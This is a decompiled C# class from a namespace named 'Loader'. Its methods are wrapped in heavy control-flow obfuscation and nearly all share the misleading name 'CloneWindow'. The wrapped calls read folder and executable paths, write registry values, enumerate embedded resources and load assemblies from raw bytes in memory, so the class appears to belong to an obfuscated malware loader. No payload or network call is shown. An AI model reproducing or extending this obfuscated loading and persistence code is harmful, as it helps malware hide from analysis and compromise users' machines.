using System;
using System.Collections;
using System.Reflection;
using System.Runtime.Serialization;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Loader;

internal sealed class ActionTree
{
	internal static AppDomain CloneWindow(short short_0, int int_0)
	{
		int[] previousId = DeviceSerializer.previousId;
		byte[] previousId2 = ResourceContext.previousId;
		object obj = default(object);
		while (true)
		{
			int num = 0;
			int num2 = 6;
			while (true)
			{
				switch (num2)
				{
				case 0:
				case 8:
				case 9:
					obj = AppDomain.CurrentDomain;
					num2 = 3;
					continue;
				default:
					num2 = previousId[12] - 6343;
					continue;
				case 6:
					num2 = (((short_0 ^ int_0) - 0) ^ num) switch
					{
						0 => 8, 
						_ => 4, 
					};
					continue;
				case 4:
					obj = null;
					num2 = previousId2[160] - 185;
					continue;
				case 3:
					num++;
					num2 = (((short_0 * short_0 + short_0) % 2 == 0) ? 10 : (previousId2[96] - 144));
					continue;
				case 2:
					num2 = 6;
					continue;
				case 1:
					num2 = 6;
					continue;
				case 5:
					break;
				case 10:
				case 11:
					return obj as AppDomain;
				}
				break;
			}
		}
	}

	internal static string CloneWindow(Environment.SpecialFolder specialFolder_0, int int_0, char char_0)
	{
		byte[] previousId = ResourceContext.previousId;
		int[] previousId2 = DeviceSerializer.previousId;
		IEnumerable enumerable = default(IEnumerable);
		while (true)
		{
			int num = 0;
			int num2 = previousId[34] - 85;
			while (true)
			{
				switch (num2)
				{
				case 10:
					enumerable = Environment.GetFolderPath(specialFolder_0);
					num2 = previousId2[113] - 21277;
					continue;
				case 2:
				case 9:
					num2 = 8;
					continue;
				case 8:
					num2 = (((int_0 ^ char_0) - 96) ^ num) switch
					{
						0 => 10, 
						_ => 5, 
					};
					continue;
				default:
					num2 = 3;
					continue;
				case 6:
					num2 = 4;
					continue;
				case 5:
					enumerable = null;
					goto case 6;
				case 4:
					num++;
					goto case 0;
				case 0:
				{
					int num3 = 1040;
					int num4 = 218;
					if (260 >= num3 / 4 - num4)
					{
						num2 = 1;
						continue;
					}
					int num5 = previousId2[18];
					DeviceSerializer.previousId[138] = (DeviceSerializer.previousId[138] | int_0) & 0xD8;
					num2 = num5 - 18122;
					continue;
				}
				case 3:
					break;
				case 1:
					return (string)enumerable;
				}
				break;
			}
		}
	}

	internal static byte[] CloneWindow<T, U>(T gparam_0, U gparam_1, short short_0, short short_1) where T : Encoding where U : string
	{
		byte[] previousId = ResourceContext.previousId;
		object obj = default(object);
		int num3 = default(int);
		while (true)
		{
			int num = 0;
			int num2 = 4;
			while (true)
			{
				switch (num2)
				{
				case 3:
				case 11:
					num2 = 4;
					continue;
				case 10:
					num2 = ((num3 % 2 != 0) ? 4 : 9);
					continue;
				case 8:
					obj = null;
					num2 = 6;
					continue;
				case 6:
					num++;
					num3 = short_0 * short_0;
					num3 = short_0 + num3;
					num2 = 10;
					continue;
				case 1:
				case 5:
					obj = gparam_0.GetBytes(gparam_1);
					num2 = previousId[100] - 171;
					continue;
				case 4:
					num2 = (((short_1 ^ short_0) - 97) ^ num) switch
					{
						0 => previousId[207], 
						_ => 8, 
					};
					continue;
				default:
					num2 = previousId[161];
					continue;
				case 0:
				case 7:
					break;
				case 9:
					return (byte[])obj;
				}
				break;
			}
		}
	}

	internal static string CloneWindow(int int_0, int int_1)
	{
		int[] previousId = DeviceSerializer.previousId;
		IEnumerable enumerable = default(IEnumerable);
		int num3 = default(int);
		while (true)
		{
			int num = 0;
			int num2 = 5;
			while (true)
			{
				switch (num2)
				{
				case 10:
					enumerable = null;
					num2 = 8;
					continue;
				case 9:
					enumerable = Application.get_ExecutablePath();
					num2 = 8;
					continue;
				case 8:
					num++;
					num3 = 538;
					goto case 7;
				case 7:
				{
					int num4 = 156;
					num2 = ((269 < num3 / 2 - num4) ? 5 : 0);
					continue;
				}
				case 6:
					num2 = 5;
					continue;
				case 4:
				case 5:
					num2 = (((int_0 ^ int_1) - 52) ^ num) switch
					{
						0 => previousId[304] - 24268, 
						_ => 10, 
					};
					continue;
				default:
					num2 = 1;
					continue;
				case 1:
					break;
				case 0:
					return enumerable as string;
				}
				break;
			}
		}
	}

	internal static void CloneWindow<T, U, V>(T gparam_0, V gparam_1, U gparam_2, int int_0, short short_0) where T : RegistryKey where V : string
	{
		int[] previousId = DeviceSerializer.previousId;
		byte[] previousId2 = ResourceContext.previousId;
		int num = 8;
		int num2 = default(int);
		while (true)
		{
			switch (num)
			{
			case 0:
			case 3:
			case 5:
			case 9:
			{
				num2++;
				int num3 = 423;
				int num4 = 804;
				num = ((6432 > num4 - num3 * 8) ? (previousId[23] - 53676) : (previousId2[226] - 127));
				break;
			}
			default:
				num2 = 0;
				num = 4;
				break;
			case 7:
				gparam_0.SetValue(gparam_1, gparam_2);
				goto case 0;
			case 4:
				num = (((short_0 ^ int_0) - 37) ^ num2) switch
				{
					0 => 7, 
					_ => 1, 
				};
				break;
			case 2:
				num = (int)previousId2[267] / 6;
				break;
			case 1:
				num = previousId[126] - 48247;
				break;
			case 6:
				return;
			}
		}
	}

	internal static void CloneWindow<T>(T gparam_0, short short_0, char char_0) where T : Array
	{
		int[] previousId = DeviceSerializer.previousId;
		int num = 9;
		int num2 = default(int);
		while (true)
		{
			switch (num)
			{
			default:
				num2 = 0;
				num = 6;
				break;
			case 8:
				num = (((short_0 * short_0 + short_0) % 2 == 0) ? 2 : (previousId[242] - 48468));
				break;
			case 7:
				num = 6;
				break;
			case 6:
				num = (((char_0 ^ short_0) - 100) ^ num2) switch
				{
					0 => previousId[70] - 59852, 
					_ => previousId[133] - previousId[307], 
				};
				break;
			case 5:
			{
				int num3 = num2;
				ResourceContext.previousId[366] = (byte)(ResourceContext.previousId[366] & short_0 & 0x8E);
				num2 = num3 + 1;
				goto case 8;
			}
			case 1:
			case 4:
				Array.Reverse(gparam_0);
				goto case 5;
			case 3:
				num = 5;
				break;
			case 0:
			case 2:
				return;
			}
		}
	}

	internal static StringBuilder CloneWindow<T>(T gparam_0, char char_0, char char_1, int int_0) where T : StringBuilder
	{
		byte[] previousId = ResourceContext.previousId;
		int[] previousId2 = DeviceSerializer.previousId;
		object obj = default(object);
		int num3 = default(int);
		while (true)
		{
			int num = 0;
			int num2 = 9;
			while (true)
			{
				switch (num2)
				{
				case 5:
				case 10:
					obj = gparam_0.Append(char_0);
					num2 = previousId[59] - 149;
					continue;
				case 9:
					num2 = (((char_1 ^ int_0) - 96) ^ num) switch
					{
						0 => 10, 
						_ => 2, 
					};
					continue;
				case 8:
					num2 = 9;
					continue;
				default:
					num2 = 11;
					continue;
				case 3:
				case 6:
					num++;
					num3 = char_0 * char_0;
					num3 = char_0 + num3;
					goto case 0;
				case 0:
					num2 = (int)previousId[104] / 8;
					continue;
				case 4:
					num2 = ((num3 % 2 != 0) ? 9 : (previousId2[225] - 404));
					continue;
				case 2:
					obj = null;
					num2 = previousId[164] - 111;
					continue;
				case 11:
					break;
				case 1:
					return obj as StringBuilder;
				}
				break;
			}
		}
	}

	internal static string[] CloneWindow<T>(T gparam_0, char char_0, int int_0) where T : Assembly
	{
		byte[] previousId = ResourceContext.previousId;
		int[] previousId2 = DeviceSerializer.previousId;
		object obj = default(object);
		int num3 = default(int);
		while (true)
		{
			int num = 0;
			int num2 = 10;
			while (true)
			{
				switch (num2)
				{
				case 11:
					obj = gparam_0.GetManifestResourceNames();
					num2 = 0;
					continue;
				case 10:
					num2 = (((char_0 ^ int_0) - 119) ^ num) switch
					{
						0 => 11, 
						_ => previousId[207], 
					};
					continue;
				case 6:
					num2 = previousId2[265] - 55138;
					continue;
				case 1:
				case 5:
					obj = null;
					num2 = previousId2[83] - 13299;
					continue;
				default:
					num2 = 9;
					continue;
				case 3:
					num2 = ((num3 % 2 != 0) ? 10 : (previousId2[221] - 31660));
					continue;
				case 0:
					num++;
					num3 = char_0 * char_0;
					num3 = char_0 + num3;
					num2 = previousId[207] - 2;
					continue;
				case 9:
					break;
				case 2:
				case 7:
				case 8:
					return (string[])obj;
				}
				break;
			}
		}
	}

	internal static int CloneWindow<T>(T gparam_0, int int_0, int int_1, short short_0, char char_0) where T : Random
	{
		byte[] previousId = ResourceContext.previousId;
		int[] previousId2 = DeviceSerializer.previousId;
		int result = default(int);
		while (true)
		{
			int num = 0;
			int num2 = previousId2[83] - 13299;
			while (true)
			{
				switch (num2)
				{
				case 2:
				case 11:
					num++;
					goto case 7;
				case 7:
					num2 = (((char_0 * char_0 + char_0) % 2 == 0) ? 6 : 8);
					continue;
				case 10:
					result = gparam_0.Next(int_0, int_1);
					num2 = 11;
					continue;
				case 9:
					num2 = 11;
					continue;
				case 8:
					num2 = 0;
					continue;
				case 4:
					num2 = 0;
					continue;
				case 3:
					result = int_1;
					goto case 9;
				default:
					num2 = previousId[207];
					continue;
				case 0:
				{
					int num3 = (short_0 ^ char_0) - 68;
					int num4 = num;
					DeviceSerializer.previousId[148] = (DeviceSerializer.previousId[148] | DeviceSerializer.previousId[82]) & 0x2A;
					num2 = (num3 ^ num4) switch
					{
						0 => 10, 
						_ => previousId2[129] - 51241, 
					};
					continue;
				}
				case 5:
					break;
				case 6:
					return result;
				}
				break;
			}
		}
	}

	internal static int CloneWindow(char char_0, char char_1)
	{
		int[] previousId = DeviceSerializer.previousId;
		byte[] previousId2 = ResourceContext.previousId;
		int result = default(int);
		while (true)
		{
			int num = 0;
			int num2 = 2;
			while (true)
			{
				switch (num2)
				{
				case 7:
				case 10:
					num2 = previousId2[161];
					continue;
				default:
					num2 = 3;
					continue;
				case 5:
					num2 = 2;
					continue;
				case 4:
					result = 10;
					goto case 7;
				case 2:
					num2 = (((char_0 ^ char_1) - 13) ^ num) switch
					{
						0 => previousId[284] - 9177, 
						_ => 4, 
					};
					continue;
				case 1:
					result = Environment.TickCount;
					num2 = 0;
					continue;
				case 0:
				{
					num++;
					int num3 = 3184;
					int num4 = 497;
					num2 = ((796 < num3 / 4 - num4) ? (previousId[293] - 36769) : (previousId2[262] - 207));
					continue;
				}
				case 3:
				case 8:
					break;
				case 6:
					return result;
				}
				break;
			}
		}
	}

	internal static void CloneWindow<T>(T gparam_0, short short_0, int int_0) where T : RegistryKey
	{
		int[] previousId = DeviceSerializer.previousId;
		byte[] previousId2 = ResourceContext.previousId;
		int num = 7;
		int num2 = default(int);
		while (true)
		{
			switch (num)
			{
			default:
				num2 = 0;
				num = previousId[205] - 1600;
				break;
			case 8:
			{
				num2++;
				int num3 = 464;
				int num4 = 842;
				if (5052 <= num4 - num3 * 6)
				{
					num = 2;
					break;
				}
				byte num5 = previousId2[100];
				DeviceSerializer.previousId[90] = (DeviceSerializer.previousId[90] + int_0) & 0x10;
				num = num5 - 173;
				break;
			}
			case 0:
			case 6:
				gparam_0.Close();
				goto case 8;
			case 5:
				num = previousId2[268] - 180;
				break;
			case 1:
			case 3:
				num = (((int_0 ^ short_0) - 119) ^ num2) switch
				{
					0 => previousId[155] - 39703, 
					_ => (int)previousId2[12] / 4, 
				};
				break;
			case 2:
				num = 3;
				break;
			case 4:
				return;
			}
		}
	}

	internal static Assembly CloneWindow(byte[] byte_0, short short_0, char char_0)
	{
		byte[] previousId = ResourceContext.previousId;
		int[] previousId2 = DeviceSerializer.previousId;
		int num3 = default(int);
		ISerializable serializable = default(ISerializable);
		while (true)
		{
			int num = 0;
			int num2 = (int)previousId[161] / 4;
			while (true)
			{
				switch (num2)
				{
				case 1:
				case 9:
					num2 = 0;
					continue;
				default:
					num2 = 10;
					continue;
				case 7:
				{
					int num4 = 143;
					num2 = ((284 >= num3 / 4 - num4) ? 4 : 0);
					continue;
				}
				case 6:
					serializable = Assembly.Load(byte_0);
					num2 = 2;
					continue;
				case 3:
				case 5:
					serializable = null;
					num2 = 2;
					continue;
				case 2:
					num++;
					num3 = 1136;
					goto case 7;
				case 0:
					num2 = (((short_0 ^ char_0) - 33) ^ num) switch
					{
						0 => previousId[39] * 6, 
						_ => previousId2[237] - 26942, 
					};
					continue;
				case 10:
					break;
				case 4:
					return (Assembly)serializable;
				}
				break;
			}
		}
	}
}
